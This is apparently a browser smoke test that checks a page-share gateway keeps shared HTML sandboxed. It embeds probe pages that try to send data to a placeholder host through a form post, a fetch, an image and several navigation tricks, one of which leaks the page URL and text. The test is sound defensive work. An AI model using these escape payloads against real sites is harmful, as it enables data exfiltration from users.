// #2911 item 8: page shares opened in a real browser, through the real share gateway (createOfficeShareGateway with the
// page shares), with NO real tunnel (the leader's condition 3): Chromium's requests to the quick-tunnel host are routed
// to the local gateway with that Host, as cloudflared would pass them; every other request is recorded and refused.
// The design's viewer table (condition 1) and #2917 review P1, as native controls:
// - the probe page: renders inside our wrapper; its scripts run; its origin is opaque; cookie and storage throw; fetch,
//   an <img> and a form to another host are blocked; window.open gives null;
// - self-navigation (location.replace with its own URL in the query), a meta refresh, a target=_top link and
//   top.location: none reaches another host — the wrapper's frame-src 'self' contains them;
// - the frame opened by itself (a tab): 404; a dashboard path on the share host: 404; an ended link: the ended page;
// - a positive control: the self-navigation page served top level, as #2917 first did, IS recorded leaving (the
//   harness sees escapes: Prism's P1 reproduced, and the wrapper is what stops it).
//   PW_DIR=~/.cache/agend-smoke/pw REPO=<checkout> OUT=<dir> FONTCONFIG_FILE=/etc/fonts/fonts.conf \
//   npx --prefix <checkout> tsx scripts/manual/smoke/smoke-2911-page-share.mts
import { createRequire } from "node:module";
import { request } from "node:http";
import { mkdirSync } from "node:fs";
import { join } from "node:path";

const REPO = process.env.REPO!, PW = process.env.PW_DIR!, OUT = join(process.env.OUT ?? "/tmp/smoke-out", "smoke-2911-page-share");
mkdirSync(OUT, { recursive: true });
const PS = await import(REPO + "/src/page-share.ts");
const { createOfficeShareGateway } = await import(REPO + "/src/office-share.ts");

const HOST = "smoke-page-share.trycloudflare.com";
const PROBE = `<!doctype html><title>Probe</title><style>body{font:16px sans-serif;padding:16px}</style><h1>Shared page</h1><ul id="out"></ul>
<img src="https://outbound.invalid/pixel.png" alt="">
<form id="f" method="post" action="https://outbound.invalid/steal"><input name="x" value="1"></form>
<script>
const out = {}; const put = (k, v) => { out[k] = v; const li = document.createElement("li"); li.textContent = k + ": " + v; document.getElementById("out").appendChild(li); };
put("ran", "yes");
put("origin", String(self.origin));
try { put("cookie", "read:" + document.cookie); } catch (e) { put("cookie", "denied " + e.name); }
try { localStorage.setItem("k", "v"); put("storage", "allowed"); } catch (e) { put("storage", "denied " + e.name); }
try { put("popup", String(window.open("https://outbound.invalid/popup") === null ? "null" : "opened")); } catch (e) { put("popup", "denied " + e.name); }
fetch("https://outbound.invalid/x").then(() => put("fetch", "allowed"), (e) => put("fetch", "blocked " + e.name));
try { document.getElementById("f").submit(); } catch (e) { put("form", "denied " + e.name); }
setTimeout(() => { window.__probe = out; }, 800);
</script>`;
const ESCAPES: Record<string, string> = {
  selfNavigate: `<title>Nav</title><script>setTimeout(() => location.replace("https://outbound.invalid/leak?u=" + encodeURIComponent(location.href) + "&t=" + encodeURIComponent(document.body.innerText)), 100)</script><p>secret text</p>`,
  metaRefresh: `<title>Meta</title><meta http-equiv="refresh" content="0;url=https://outbound.invalid/meta"><p>x</p>`,
  topLink: `<title>Top</title><a id="a" href="https://outbound.invalid/top" target="_top">x</a><script>document.getElementById("a").click(); try { top.location = "https://outbound.invalid/top2"; } catch (e) {}</script>`,
  locationHref: `<title>Href</title><script>location.href = "https://outbound.invalid/href";</script>`,
};

const pages = new PS.PageShares({});
const mk = (html: string, title: string) => { const m = pages.create({ html, instance: "w", title, owner: "o" }); if (!m.ok) throw new Error(m.error); return m.token; };
const probeToken = mk(PROBE, "Probe");
const escapeTokens = Object.fromEntries(Object.entries(ESCAPES).map(([k, h]) => [k, mk(h, k)]));
const gw = createOfficeShareGateway({ shares: { find: () => null }, source: { status: () => ({}), org: () => ({}), offices: () => ({ rev: 1, offices: [] }), acts: () => [], traffic: () => ({}), needs: () => [], hidden: () => false } as any, pages, statics: () => null });
const local = await gw.listen();
gw.setHost(HOST);

const pw = createRequire(PW + "/")("playwright-core");
const browser = await pw.chromium.launch({ ...(process.env.CHROME ? { executablePath: process.env.CHROME } : {}), args: ["--no-sandbox"] });
const results: any = { browser: browser.version(), escapes: {} };
const outbound: string[] = [];
try {
  const ctx = await browser.newContext();
  await ctx.route("**/*", async (route: any) => {
    const u = new URL(route.request().url());
    if (u.host !== HOST) { outbound.push(`${route.request().method()} ${u.href.slice(0, 120)}`); return route.abort(); }
    // The positive control: the way #2917 first served a share (the page itself, top level, sandboxed by its CSP).
    if (u.pathname === "/control-top-level") return route.fulfill({ status: 200, headers: { "content-type": "text/html", "content-security-policy": PS.PAGE_SHARE_CSP.replace("frame-ancestors 'self'", "frame-ancestors 'none'") }, body: ESCAPES.selfNavigate });
    const res: any = await new Promise((ok, no) => {
      const headers: Record<string, string> = { host: HOST, cookie: "agend_session=planted" };
      const dest = route.request().headers()["sec-fetch-dest"] ?? (route.request().frame()?.parentFrame() ? "iframe" : "document");
      headers["sec-fetch-dest"] = dest;
      const r = request({ host: "127.0.0.1", port: Number(local.port), method: route.request().method(), path: u.pathname + u.search, headers }, (m) => {
        const chunks: Buffer[] = []; m.on("data", (c) => chunks.push(c)); m.on("end", () => ok({ status: m.statusCode, headers: m.headers, body: Buffer.concat(chunks) }));
      }); r.on("error", no); r.end();
    });
    const headers: Record<string, string> = {};
    for (const [k, v] of Object.entries(res.headers)) if (v !== undefined) headers[k] = Array.isArray(v) ? v.join(", ") : String(v);
    await route.fulfill({ status: res.status, headers, body: res.body });
  });
  const page = await ctx.newPage();
  const errors: string[] = [];
  page.on("pageerror", (e: any) => errors.push(String(e).slice(0, 160)));
  // The probe.
  const resp = await page.goto(`https://${HOST}/p/${probeToken}`);
  results.status = resp.status();
  await page.waitForTimeout(1500);
  const frame = page.frames().find((f: any) => f !== page.mainFrame());
  results.wrapper = { title: await page.title(), frameUrl: frame ? new URL(frame.url()).pathname.replace(probeToken, "<token>") : null };
  results.probe = frame ? await frame.evaluate(() => (window as any).__probe) : null;
  await page.screenshot({ path: join(OUT, "1-probe.png") });
  // The escapes: each in its wrapper; the top must stay on the share's wrapper URL, and nothing may leave.
  for (const [k, token] of Object.entries(escapeTokens)) {
    const before = outbound.length;
    await page.goto(`https://${HOST}/p/${token}`);
    await page.waitForTimeout(1500);
    results.escapes[k] = { topStill: page.url() === `https://${HOST}/p/${token}`, outbound: outbound.slice(before) };
  }
  // The frame by itself, a dashboard path, and an ended link.
  const direct = await page.goto(`https://${HOST}/p/${probeToken}/frame`);
  results.frameDirect = direct.status();
  results.dashboardPath = (await page.goto(`https://${HOST}/ui/chat/w`)).status();
  pages.revoke("all");
  const ended = await page.goto(`https://${HOST}/p/${probeToken}`);
  results.ended = { status: ended.status(), text: (await page.textContent("body"))?.trim().slice(0, 40) };
  results.cookiesInBrowser = (await ctx.cookies()).length;
  // The positive control: the same self-navigation served top level (as #2917 first did) IS seen by the harness.
  const before = outbound.length;
  await page.goto(`https://${HOST}/control-top-level`);
  await page.waitForTimeout(1500);
  results.positiveControl = outbound.slice(before);
  results.outboundBeforeControl = outbound.slice(0, before);
  results.errors = errors;
  const p = results.probe ?? {};
  results.pass = results.status === 200 && results.wrapper.frameUrl === "/p/<token>/frame"
    && p.ran === "yes" && p.origin === "null" && /^denied/.test(p.cookie) && /^denied/.test(p.storage) && p.popup === "null" && /^blocked/.test(p.fetch)
    && Object.values(results.escapes).every((e: any) => e.topStill && e.outbound.length === 0)
    && results.outboundBeforeControl.length === 0 && results.positiveControl.some((x: string) => x.includes("outbound.invalid/leak"))
    && results.frameDirect === 404 && results.dashboardPath === 404 && results.ended.status === 404 && /has ended/.test(results.ended.text) && results.cookiesInBrowser === 0;
  await ctx.close();
} finally {
  await browser.close();
  gw.close();
}
console.log(JSON.stringify(results, null, 1));
console.log(results.pass ? "PASS" : "FAIL");
process.exit(results.pass ? 0 : 1);
